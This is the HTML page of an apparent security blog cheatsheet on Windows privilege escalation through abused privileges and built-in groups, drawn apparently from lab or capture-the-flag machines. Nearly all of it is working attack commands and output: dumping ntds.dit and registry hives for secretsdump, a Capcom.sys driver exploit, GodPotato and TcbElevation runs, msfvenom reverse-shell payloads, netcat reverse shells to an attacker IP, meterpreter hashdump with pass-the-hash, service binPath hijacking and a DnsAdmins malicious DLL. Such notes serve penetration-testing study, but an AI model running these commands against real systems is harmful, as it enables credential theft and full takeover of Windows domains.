@@ -1,0 +1,257 @@
+<!doctype html>
+<html lang="en">
+<head>
+
+
+<meta charset="utf-8"><script>(function(){try{var T={"butterfly":"/","claude":"/claude/","loaf":"/loaf/"},here="claude",root=T[here],L=location,p=L.pathname;var q=new URLSearchParams(L.search),want=q.get("theme"),picked=want&&T[want]!==undefined;if(picked){localStorage.setItem("blog-theme",want);q.delete("theme")}else{want=localStorage.getItem("blog-theme")}var s=q.toString();s=s?"?"+s:"";var lost=p.indexOf(root)!==0;for(var k in T){if(k!==here&&T[k].length>root.length&&p.indexOf(T[k])===0)lost=true}if(want&&want!==here&&T[want]!==undefined&&!lost){L.replace(T[want]+p.slice(root.length)+s+L.hash);return}if(picked){history.replaceState(null,"",p+s+L.hash);var st=document.createElement("style");st.textContent="@view-transition{navigation:auto}";document.head.appendChild(st)}}catch(e){}})()</script><style>.tsw{position:relative}.tsw summary{list-style:none;cursor:pointer;user-select:none}.tsw summary::-webkit-details-marker{display:none}.tsw-menu{position:absolute;right:0;top:calc(100% + .4rem);z-index:50;display:grid;min-width:9.5rem;padding:.3rem;border:1px solid var(--line);border-radius:8px;background:var(--bg);box-shadow:0 6px 24px rgba(0,0,0,.18)}.tsw-menu a{display:block;padding:.35rem .6rem;border-radius:5px;color:var(--fg);text-decoration:none;white-space:nowrap;box-shadow:none}.tsw-menu a:hover{background:var(--surface)}.tsw-menu a[aria-current]{color:var(--accent)}.tsw-menu a[aria-current]::after{content:" ✓"}@media print{.tsw{display:none}}.nav .tsw summary{color:var(--muted)}.nav .tsw summary:hover,.nav .tsw[open] summary{color:var(--accent)}.nav .tsw-menu a{color:var(--fg)}@media (max-width:40rem){.site-header{position:relative}.nav .tsw{position:static}.nav .tsw-menu{top:100%}}</style>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Windows Privilege Escalation · serioton</title>
+
+<meta name="description" content="practical techniques for abusing some windows privileges and built-in security groups">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Windows Privilege Escalation">
+<meta property="og:url" content="https://seriotonctf.github.io/claude/Windows-Privesc/index.html">
+<meta property="og:site_name" content="serioton">
+<meta property="og:description" content="practical techniques for abusing some windows privileges and built-in security groups">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://seriotonctf.github.io/img/thumbnails/windows-privesc.png">
+<meta property="article:published_time" content="2024-08-10T15:00:00.000Z">
+<meta property="article:modified_time" content="2026-06-23T23:17:21.000Z">
+<meta property="article:author" content="serioton">
+<meta property="article:tag" content="windows">
+<meta property="article:tag" content="backup operators">
+<meta property="article:tag" content="seimpersonateprivilege">
+<meta property="article:tag" content="privilege escalation">
+<meta property="article:tag" content="sebackupprivilege">
+<meta property="article:tag" content="dnsadmins">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://seriotonctf.github.io/img/thumbnails/windows-privesc.png">
+<link rel="canonical" href="https://seriotonctf.github.io/Windows-Privesc/">
+<meta name="theme-color" content="#faf9f5" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#1f1e1d" media="(prefers-color-scheme: dark)">
+
+<link rel="icon" href="/claude/img/favicon.png">
+
+
+<link rel="alternate" type="application/atom+xml" title="serioton" href="/claude/atom.xml">
+
+<link rel="preload" as="font" type="font/woff2" href="/claude/fonts/iosevka-latin-400-normal.woff2" crossorigin>
+<link rel="stylesheet" href="/claude/css/claude.css">
+<script>try{var t=localStorage.getItem('theme');if(t==='dark'||t==='light')document.documentElement.dataset.theme=t}catch(e){}</script>
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body>
+<a class="skip" href="#main">skip to content</a>
+<header class="site-header wrap">
+  <a class="brand" href="/claude/"><span class="spark" aria-hidden="true">✻</span> serioton</a>
+  <nav class="nav" aria-label="main">
+    
+    <a href="/claude/archives/">/archives</a>
+    
+    <a href="/claude/categories/">/categories</a>
+    
+    <a href="/claude/tags/">/tags</a>
+    
+    <a href="/claude/about/">/about</a>
+    
+    <details class="tsw"><summary title="switch the blog theme">/skin</summary><div class="tsw-menu"><a data-switch="butterfly" href="/?theme=butterfly">Butterfly</a><a data-switch="claude" href="/claude/?theme=claude" aria-current="true">Claude Code</a><a data-switch="loaf" href="/loaf/?theme=loaf">Loaf</a></div></details>
+    <button type="button" data-theme-toggle title="switch between light and dark">/theme</button>
+  </nav>
+</header>
+
+<main id="main" class="wrap">
+
+
+
+
+<article class="post" data-post="Windows Privilege Escalation">
+  <p class="you"><span aria-hidden="true">&gt;</span> cat posts/Windows-Privesc.md</p>
+
+  <header class="tool post-head">
+    <p class="call"><b>Read</b>(posts/Windows-Privesc.md)</p>
+    <p class="result">Read 455 lines</p>
+  </header>
+
+  <div class="say">
+    <h1>Windows Privilege Escalation</h1>
+    <p class="lede">practical techniques for abusing some windows privileges and built-in security groups</p>
+    <div class="meta">
+      <time datetime="2024-08-10T15:00:00.000Z">2024-08-10</time>
+      <a href="/claude/categories/cheatsheet/">cheatsheet</a>
+      
+      <a href="/claude/tags/windows/" rel="tag">#windows</a><a href="/claude/tags/backup-operators/" rel="tag">#backup operators</a><a href="/claude/tags/seimpersonateprivilege/" rel="tag">#seimpersonateprivilege</a><a href="/claude/tags/privilege-escalation/" rel="tag">#privilege escalation</a><a href="/claude/tags/sebackupprivilege/" rel="tag">#sebackupprivilege</a><a href="/claude/tags/dnsadmins/" rel="tag">#dnsadmins</a>
+    </div>
+  </div>
+
+  
+
+  <div class="post-body">
+    
+    <nav class="todos" aria-label="table of contents">
+      <details>
+        <summary><b>Update Todos</b></summary>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Privileges"><span class="toc-text">Privileges</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SeBackupPrivilege"><span class="toc-text">SeBackupPrivilege</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Disk-Shadow-method"><span class="toc-text">Disk Shadow method</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SeLoadDriverPrivilege"><span class="toc-text">SeLoadDriverPrivilege</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SeImpersonatePrivilege"><span class="toc-text">SeImpersonatePrivilege</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SeDebugPrivilege"><span class="toc-text">SeDebugPrivilege</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Method-1"><span class="toc-text">Method 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Method-2"><span class="toc-text">Method 2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Method-3"><span class="toc-text">Method 3</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SeTcbPrivilege"><span class="toc-text">SeTcbPrivilege</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Built-in-Groups"><span class="toc-text">Built-in Groups</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Backup-Operators"><span class="toc-text">Backup Operators</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Server-Operators"><span class="toc-text">Server Operators</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Account-Operators"><span class="toc-text">Account Operators</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DnsAdmins"><span class="toc-text">DnsAdmins</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Resources"><span class="toc-text">Resources</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Practice"><span class="toc-text">Practice</span></a></li></ol></li></ol>
+      </details>
+    </nav>
+    
+    
+    <label class="section-filter" hidden>
+      <span aria-hidden="true">grep</span>
+      <input type="search" placeholder="filter sections…" autocomplete="off" spellcheck="false" aria-label="filter sections">
+      <em aria-live="polite"></em>
+    </label>
+    
+    <div class="prose">
+      <h1 id="Privileges"><a href="#Privileges" class="headerlink" title="Privileges"></a>Privileges</h1><h3 id="SeBackupPrivilege"><a href="#SeBackupPrivilege" class="headerlink" title="SeBackupPrivilege"></a>SeBackupPrivilege</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt; whoami /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Privilege Name                Description                    State</span><br><span class="line">============================= ============================== =======</span><br><span class="line">...</span><br><span class="line">SeBackupPrivilege             Back up files and directories  Enabled</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<h3 id="Disk-Shadow-method"><a href="#Disk-Shadow-method" class="headerlink" title="Disk Shadow method"></a>Disk Shadow method</h3><p>pwn.txt file content</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set context persistent nowriters </span><br><span class="line">add volume c: alias pwn </span><br><span class="line">create </span><br><span class="line">expose %pwn% z: </span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt; upload pwn.txt</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt; diskshadow /s pwn.txt</span><br><span class="line">Microsoft DiskShadow version 1.0</span><br><span class="line">Copyright (C) 2013 Microsoft Corporation</span><br><span class="line">On computer:  BABYDC,  8/9/2024 10:57:34 PM</span><br><span class="line"></span><br><span class="line">-&gt; set context persistent nowriters</span><br><span class="line">-&gt; add volume c: alias pwn</span><br><span class="line">-&gt; create</span><br><span class="line">Alias pwn for shadow ID &#123;041d93f3-797d-4f91-a270-5c1fb66092e6&#125; set as environment variable.</span><br><span class="line">Alias VSS_SHADOW_SET for shadow set ID &#123;7df9215a-2efb-4a28-befe-cbaf15deba8c&#125; set as environment variable.</span><br><span class="line"></span><br><span class="line">Querying all shadow copies with the shadow copy set ID &#123;7df9215a-2efb-4a28-befe-cbaf15deba8c&#125;</span><br><span class="line"></span><br><span class="line">        * Shadow copy ID = &#123;041d93f3-797d-4f91-a270-5c1fb66092e6&#125;               %pwn%</span><br><span class="line">                - Shadow copy set: &#123;7df9215a-2efb-4a28-befe-cbaf15deba8c&#125;       %VSS_SHADOW_SET%</span><br><span class="line">                - Original count of shadow copies = 1</span><br><span class="line">                - Original volume name: \\?\Volume&#123;1b77e212-0000-0000-0000-100000000000&#125;\ [C:\]</span><br><span class="line">                - Creation time: 8/9/2024 10:57:36 PM</span><br><span class="line">                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1</span><br><span class="line">                - Originating machine: BabyDC.baby.vl</span><br><span class="line">                - Service machine: BabyDC.baby.vl</span><br><span class="line">                - Not exposed</span><br><span class="line">                - Provider ID: &#123;b5946137-7b9f-4925-af80-51abd60b20d5&#125;</span><br><span class="line">                - Attributes:  No_Auto_Release Persistent No_Writers Differential</span><br><span class="line"></span><br><span class="line">Number of shadow copies listed: 1</span><br><span class="line">-&gt; expose %pwn% z:</span><br><span class="line">-&gt; %pwn% = &#123;041d93f3-797d-4f91-a270-5c1fb66092e6&#125;</span><br><span class="line">The shadow copy was successfully exposed as z:\.</span><br><span class="line">-&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt; robocopy /b z:\windows\ntds . ntds.dit</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">   ROBOCOPY     ::     Robust File Copy for Windows</span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">  Started : Friday, August 9, 2024 10:57:58 PM</span><br><span class="line">   Source : z:\windows\ntds\</span><br><span class="line">     Dest : C:\temp\</span><br><span class="line"></span><br><span class="line">    Files : ntds.dit</span><br><span class="line"></span><br><span class="line">  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30</span><br><span class="line"></span><br><span class="line">------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">                           1    z:\windows\ntds\</span><br><span class="line">            New File              16.0 m        ntds.dit</span><br><span class="line"></span><br><span class="line">[SNIP]</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt; reg save HKLM\SYSTEM c:\temp\system</span><br><span class="line">The operation completed successfully.</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt; download system</span><br><span class="line"></span><br><span class="line">Info: Downloading C:\temp\system to system</span><br><span class="line"></span><br><span class="line">Info: Download successful!</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt; download ntds.dit</span><br><span class="line"></span><br><span class="line">Info: Downloading C:\temp\ntds.dit to ntds.dit</span><br><span class="line"></span><br><span class="line">Info: Download successful!</span><br></pre></td></tr></table></figure>
+<figure class="highlight terminal plaintext"><table><tr><td class="code"><pre><span class="line cmd"><span class="prompt">$ </span>secretsdump.py -system system -ntds ntds.dit local</span><br></pre></td></tr></table></figure>
+<h2 id="SeLoadDriverPrivilege"><a href="#SeLoadDriverPrivilege" class="headerlink" title="SeLoadDriverPrivilege"></a>SeLoadDriverPrivilege</h2><p>-&gt; <a target="_blank" rel="noopener" href="https://github.com/k4sth4/SeLoadDriverPrivilege">https://github.com/k4sth4/SeLoadDriverPrivilege</a></p>
+<figure class="highlight terminal plaintext"><table><tr><td class="code"><pre><span class="line cmd"><span class="prompt">$ </span>msfvenom -p windows/shell_reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -f exe -o shell.exe</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt; upload Capcom.sys</span><br><span class="line">&gt; upload ExploitCapcom.exe</span><br><span class="line">&gt; upload eoploaddriver_x64.exe</span><br><span class="line">&gt; upload shell.exe</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt; .\eoploaddriver_x64.exe System\CurrentControlSet\dfserv C:\temp\Capcom.sys</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt; .\ExploitCapcom.exe LOAD \temp\Capcom.sys</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt; .\ExploitCapcom.exe EXPLOIT .\shell.exe</span><br></pre></td></tr></table></figure>
+<h2 id="SeImpersonatePrivilege"><a href="#SeImpersonatePrivilege" class="headerlink" title="SeImpersonatePrivilege"></a>SeImpersonatePrivilege</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt; whoami /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Privilege Name                Description                               State</span><br><span class="line">============================= ========================================= ========</span><br><span class="line">...</span><br><span class="line">SeImpersonatePrivilege        Impersonate a client after authentication Enabled</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt; iwr http://&lt;attacker_ip&gt;/GodPotato-NET4.exe -outfile gp.exe</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt; .\gp.exe -cmd &quot;C:\Users\Public\nc64.exe -e cmd.exe &lt;attacker_ip&gt; &lt;port&gt;&quot;</span><br><span class="line">[*] CombaseModule: 0x140733127524352</span><br><span class="line">[*] DispatchTable: 0x140733130111304</span><br><span class="line">[*] UseProtseqFunction: 0x140733129406688</span><br><span class="line">[*] UseProtseqFunctionParamCount: 6</span><br><span class="line">[*] HookRPC</span><br><span class="line">[*] Start PipeServer</span><br><span class="line">[*] CreateNamedPipe \\.\pipe\eb27b3cc-7b5a-420d-8f01-d3094f6ee323\pipe\epmapper</span><br><span class="line">[*] Trigger RPCSS</span><br><span class="line">[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046</span><br><span class="line">[*] DCOM obj IPID: 00000402-0d08-ffff-8e84-859d1b28d501</span><br><span class="line">[*] DCOM obj OXID: 0xd402854b19147ceb</span><br><span class="line">[*] DCOM obj OID: 0x20ef4be3bfc76a84</span><br><span class="line">[*] DCOM obj Flags: 0x281</span><br><span class="line">[*] DCOM obj PublicRefs: 0x0</span><br><span class="line">[*] Marshal Object bytes len: 100</span><br><span class="line">[*] UnMarshal Object</span><br><span class="line">[*] Pipe Connected!</span><br><span class="line">[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE</span><br><span class="line">[*] CurrentsImpersonationLevel: Impersonation</span><br><span class="line">[*] Start Search System Token</span><br><span class="line">[*] PID : 892 Token:0x496  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation</span><br><span class="line">[*] Find System Token : True</span><br><span class="line">[*] UnmarshalObject: 0x80070776</span><br><span class="line">[*] CurrentUser: NT AUTHORITY\SYSTEM</span><br><span class="line">[*] process start with pid 3040</span><br></pre></td></tr></table></figure>
+<figure class="highlight terminal plaintext"><table><tr><td class="code"><pre><span class="line cmd"><span class="prompt">$ </span>nc -nlvp 443</span><br><span class="line out">listening on [any] 443 ...</span><br><span class="line out"></span><br><span class="line out">...</span><br><span class="line out"></span><br><span class="line out">&gt; whoami</span><br><span class="line out">nt authority\system</span><br></pre></td></tr></table></figure>
+<h2 id="SeDebugPrivilege"><a href="#SeDebugPrivilege" class="headerlink" title="SeDebugPrivilege"></a>SeDebugPrivilege</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt; whoami /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Privilege Name                Description                    State   </span><br><span class="line">============================= ============================== ========</span><br><span class="line">SeDebugPrivilege              Debug programs                 Enabled </span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking       Enabled </span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a process working set Disabled</span><br></pre></td></tr></table></figure>
+<h3 id="Method-1"><a href="#Method-1" class="headerlink" title="Method 1"></a>Method 1</h3><figure class="highlight terminal plaintext"><table><tr><td class="code"><pre><span class="line cmd"><span class="prompt">$ </span>msfvenom -p windows/x64/meterpreter/reverse_tcp -ax64 -f exe LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -o shell.exe</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt; iwr http://&lt;ip&gt;/shell.exe -outfile shell.exe</span><br><span class="line">&gt; .\shell.exe</span><br></pre></td></tr></table></figure>
+<figure class="highlight terminal plaintext"><table><tr><td class="code"><pre><span class="line cmd"><span class="prompt">msf6 &gt; </span>use exploit/multi/handler</span><br><span class="line out">[*] Using configured payload generic/shell_reverse_tcp</span><br><span class="line out">msf6 exploit(multi/handler) &gt; set lhost tun0</span><br><span class="line out">msf6 exploit(multi/handler) &gt; set lport 443</span><br><span class="line out">msf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line out">msf6 exploit(multi/handler) &gt; exploit</span><br><span class="line out"></span><br><span class="line out">[*] Started reverse TCP handler on &lt;attacker_ip&gt;:&lt;port&gt;</span><br><span class="line out">[*] Sending stage (200774 bytes) to &lt;target_ip&gt;</span><br><span class="line out">[*] Meterpreter session 1 opened [SNIP]</span><br></pre></td></tr></table></figure>
+<figure class="highlight terminal plaintext"><table><tr><td class="code"><pre><span class="line cmd"><span class="prompt">meterpreter &gt; </span>hashdump</span><br></pre></td></tr></table></figure>
+<figure class="highlight terminal plaintext"><table><tr><td class="code"><pre><span class="line cmd"><span class="prompt">meterpreter &gt; </span>portfwd add -L 127.0.0.1 -l 445 -p 445 -r &lt;target_ip&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">smbexec.py administrator@127.0.0.1 -hashes :&lt;hash&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="Method-2"><a href="#Method-2" class="headerlink" title="Method 2"></a>Method 2</h3><figure class="highlight terminal plaintext"><table><tr><td class="code"><pre><span class="line cmd"><span class="prompt">meterpreter &gt; </span>ps winlogon</span><br><span class="line out">Filtering on &#x27;winlogon&#x27;</span><br><span class="line out"></span><br><span class="line out">Process List</span><br><span class="line out">============</span><br><span class="line out"></span><br><span class="line out"> PID  PPID  Name          Arch  Session  User                 Path</span><br><span class="line out"> ---  ----  ----          ----  -------  ----                 ----</span><br><span class="line out"> 548  468   winlogon.exe  x64   1        NT AUTHORITY\SYSTEM  C:\Windows\System32\winlogon.exe</span><br></pre></td></tr></table></figure>
+<figure class="highlight terminal plaintext"><table><tr><td class="code"><pre><span class="line cmd"><span class="prompt">meterpreter &gt; </span>migrate 548</span><br><span class="line out">[*] Migrating from 5036 to 548...</span><br><span class="line out"></span><br><span class="line out">[*] Migration completed successfully. </span><br></pre></td></tr></table></figure>
+<figure class="highlight terminal plaintext"><table><tr><td class="code"><pre><span class="line cmd"><span class="prompt">meterpreter &gt; </span>getuid</span><br><span class="line out">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure>
+<h3 id="Method-3"><a href="#Method-3" class="headerlink" title="Method 3"></a>Method 3</h3><p>Using: <a target="_blank" rel="noopener" href="https://github.com/xct/adopt">https://github.com/xct/adopt</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt; upload adopt.exe</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt; .\adopt.exe vm3dservice.exe C:\windows\tasks\update.exe</span><br><span class="line">[&gt;] Target pid is 2508</span><br><span class="line">[&gt;] ShellExecuteExW is at 00007FFB7BF974A0</span><br><span class="line">[&gt;] Thread running, done! (Handle: 100)</span><br></pre></td></tr></table></figure>
+
+<h2 id="SeTcbPrivilege"><a href="#SeTcbPrivilege" class="headerlink" title="SeTcbPrivilege"></a>SeTcbPrivilege</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt; whoami /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Privilege Name                Description                         State</span><br><span class="line">============================= =================================== =======</span><br><span class="line">...</span><br><span class="line">SeTcbPrivilege                Act as part of the operating system Enabled</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>-&gt; <a target="_blank" rel="noopener" href="https://gist.github.com/antonioCoco/19563adef860614b56d010d92e67d178">https://gist.github.com/antonioCoco/19563adef860614b56d010d92e67d178</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt; curl http://&lt;attacker_ip&gt;/TcbElevation.exe -o TcbElevation.exe</span><br><span class="line">&gt; curl http://&lt;attacker_ip&gt;/rcat_&lt;attacker_ip&gt;_443.exe -o rcat_&lt;attacker_ip&gt;_443.exe # https://github.com/xct/rcat</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt; .\TcbElevation.exe pwn &quot;C:\Windows\system32\cmd.exe /c C:\Users\svc_deploy\Documents\rcat_&lt;attacker_ip&gt;_443.exe&quot;</span><br></pre></td></tr></table></figure>
+<figure class="highlight terminal plaintext"><table><tr><td class="code"><pre><span class="line cmd"><span class="prompt">$ </span>rlwrap nc -nlvp 443</span><br><span class="line out">listening on [any] 443 ...</span><br><span class="line out"></span><br><span class="line out">...</span><br><span class="line out"></span><br><span class="line out">&gt; whoami</span><br><span class="line out">nt authority\system</span><br></pre></td></tr></table></figure>
+<h1 id="Built-in-Groups"><a href="#Built-in-Groups" class="headerlink" title="Built-in Groups"></a>Built-in Groups</h1><h2 id="Backup-Operators"><a href="#Backup-Operators" class="headerlink" title="Backup Operators"></a>Backup Operators</h2><figure class="highlight terminal plaintext"><table><tr><td class="code"><pre><span class="line cmd"><span class="prompt">$ </span>smbserver.py -smb2support share share</span><br><span class="line cmd"><span class="prompt">$ </span>reg.py &lt;domain&gt;/&lt;username&gt;:&lt;password&gt;@&lt;ip&gt; backup -o &#x27;\\&lt;attacker_ip&gt;\share&#x27;</span><br><span class="line out"></span><br><span class="line out">...</span><br><span class="line out"></span><br><span class="line out">[*] Saved HKLM\SAM to \\10.10.14.8\share\SAM.save</span><br><span class="line out">[*] Saved HKLM\SYSTEM to \\10.10.14.8\share\SYSTEM.save</span><br><span class="line out">[*] Saved HKLM\SECURITY to \\10.10.14.8\share\SECURITY.save</span><br><span class="line out"></span><br><span class="line cmd"><span class="prompt">$ </span>secretsdump.py local -sam SAM.save -system SYSTEM.save -security SECURITY.save</span><br></pre></td></tr></table></figure>
+<p>Or</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt; reg save hklm\sam sam      </span><br><span class="line">&gt; download sam</span><br><span class="line">&gt; reg save hklm\system system</span><br><span class="line">&gt; download system</span><br></pre></td></tr></table></figure>
+<figure class="highlight terminal plaintext"><table><tr><td class="code"><pre><span class="line cmd"><span class="prompt">$ </span>secretsdump.py -sam sam -system system LOCAL</span><br></pre></td></tr></table></figure>
+<p>Or using the <a target="_blank" rel="noopener" href="https://www.netexec.wiki/smb-protocol/obtaining-credentials/dump-backupop">back_operator</a> module from NetExec</p>
+<figure class="highlight terminal plaintext"><table><tr><td class="code"><pre><span class="line cmd"><span class="prompt">$ </span>nxc smb &lt;ip&gt; -u &lt;username&gt; -p &lt;password&gt; -M backup_operator</span><br></pre></td></tr></table></figure>
+<h2 id="Server-Operators"><a href="#Server-Operators" class="headerlink" title="Server Operators"></a>Server Operators</h2><p>Its members can sign-in to a server, start and stop services, access domain controllers, perform maintenance tasks (such as backup and restore), and they have the ability to change binaries that are installed on the domain controllers.</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt; net user svc-printer</span><br><span class="line">...</span><br><span class="line">Local Group Memberships      *Print Operators      *Remote Management Use</span><br><span class="line">                             *Server Operators</span><br><span class="line">Global Group memberships     *Domain Users</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt; upload nc64.exe</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt; sc.exe config VMTools binPath=&quot;C:\temp\nc64.exe -e powershell.exe &lt;attacker_ip&gt; &lt;port&gt;&quot;</span><br><span class="line">[SC] ChangeServiceConfig SUCCESS</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt; sc.exe stop VMTools</span><br><span class="line"></span><br><span class="line">SERVICE_NAME: VMTools</span><br><span class="line">        TYPE               : 10  WIN32_OWN_PROCESS</span><br><span class="line">        STATE              : 1  STOPPED</span><br><span class="line">        WIN32_EXIT_CODE    : 0  (0x0)</span><br><span class="line">        SERVICE_EXIT_CODE  : 0  (0x0)</span><br><span class="line">        CHECKPOINT         : 0x0</span><br><span class="line">        WAIT_HINT          : 0x0</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt; sc.exe start VMTools</span><br></pre></td></tr></table></figure>
+<figure class="highlight terminal plaintext"><table><tr><td class="code"><pre><span class="line cmd"><span class="prompt">$ </span>rlwrap nc -nlvp 9001</span><br><span class="line out">listening on [any] 9001 ...</span><br><span class="line out"></span><br><span class="line out">...</span><br><span class="line out"></span><br><span class="line out">&gt; whoami</span><br><span class="line out">nt authority\system</span><br></pre></td></tr></table></figure>
+<h2 id="Account-Operators"><a href="#Account-Operators" class="headerlink" title="Account Operators"></a>Account Operators</h2><p>This group can create and manage many non-admin accounts.</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt; net user meow P@ssw0rd /add</span><br><span class="line">&gt; net localgroup IIS_IUSRS meow /add</span><br><span class="line">&gt; net localgroup &quot;Remote Management Users&quot; meow /add</span><br></pre></td></tr></table></figure>
+<p>Now the user meow has the SeImpersonatePrivilege</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt; .\gp.exe -cmd &quot;C:\programdata\nc64.exe -e cmd.exe &lt;attacker_ip&gt; 443&quot;</span><br></pre></td></tr></table></figure>
+<h2 id="DnsAdmins"><a href="#DnsAdmins" class="headerlink" title="DnsAdmins"></a>DnsAdmins</h2><p>When we are member of this group we can ask the machine to load an arbitrary DLL file when the service starts so that gives us RCE as SYSTEM. We can re-configure the service and we have the required privileges to restart it.</p>
+<figure class="highlight terminal plaintext"><table><tr><td class="code"><pre><span class="line cmd"><span class="prompt">$ </span>msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -f dll -o shell.dll</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt; upload shell.dll</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt; cmd /c &#x27;dnscmd &lt;DC&gt; /config /serverlevelplugindll C:\temp\shell.dll&#x27;</span><br><span class="line"></span><br><span class="line">Registry property serverlevelplugindll successfully reset.</span><br><span class="line">Command completed successfully.</span><br></pre></td></tr></table></figure>
